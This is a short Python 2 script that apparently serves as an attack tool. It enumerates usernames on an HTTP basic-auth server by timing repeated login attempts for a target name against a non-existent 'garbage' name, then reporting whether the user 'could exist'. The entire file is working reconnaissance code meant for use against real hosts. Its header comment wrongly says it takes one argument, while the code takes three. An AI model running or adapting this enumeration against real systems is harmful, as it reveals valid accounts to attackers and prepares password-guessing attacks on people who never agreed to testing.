#!/usr/bin/python
import sys
import numpy
import time
import requests
# this script, attempts to use the timing variation in real users and nonuser 
# inputs to an http basic auth interface.

# The premise is, find an oracle (in this case we use garbage) and use the 
# Aggregate response time as the baseline.  We make sure garbage doesn't exist
# as a user for the purposes of this test.

# The script currently takes a single input ala: './basicauth.py username'


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
# usage: ./basicauth.py hostname username attempts
target=sys.argv[1]
username=sys.argv[2]
loops=int(sys.argv[3])
oracle="garbage"
password="testa"
verbose=True


def requser(target, targetuser):
        url= 'http://'+target
        password="asdfasdf"
        start=time.time()
        r = requests.head(url, auth=( targetuser, password ))
        end=time.time()
        return (end-start)

def normalize( runs ):
	elem = numpy.array(runs)
	meant = numpy.mean(elem, axis=0)
	sdt = numpy.std(elem, axis=0)

	final_list2 = [x for x in runs if (x > meant - 1.97 * sdt)]
	normal = [x for x in final_list2 if (x < meant + 1.97 * sdt)]
	return normal

def checkuser( oracleuser, targetuser, target, loops ):
	oraclerun=[]
	targetrun=[]
	for x in range(0,loops):
		targetrun.append(requser(target,targetuser))
		oraclerun.append(requser(target,oracleuser))
	targetrun=normalize(targetrun)
	oraclerun=normalize(oraclerun)
	if(verbose): sys.stdout.write("ORACLE/TARGET:"+str(numpy.mean(oraclerun))+"/"+str(numpy.mean(targetrun))+"|")
	if (numpy.mean(oraclerun) > numpy.mean(targetrun)):
		return (False)
	else:
		return ( abs(numpy.mean(oraclerun) - numpy.mean(targetrun)) > 0.001 )

if checkuser(oracle, username, target, loops):
	print bcolors.OKGREEN + username + " "+ target+" "+bcolors.ENDC+" : could exist"
else:
	print bcolors.FAIL + username + " "+target+" "+ bcolors.ENDC+" : doesn't exist"
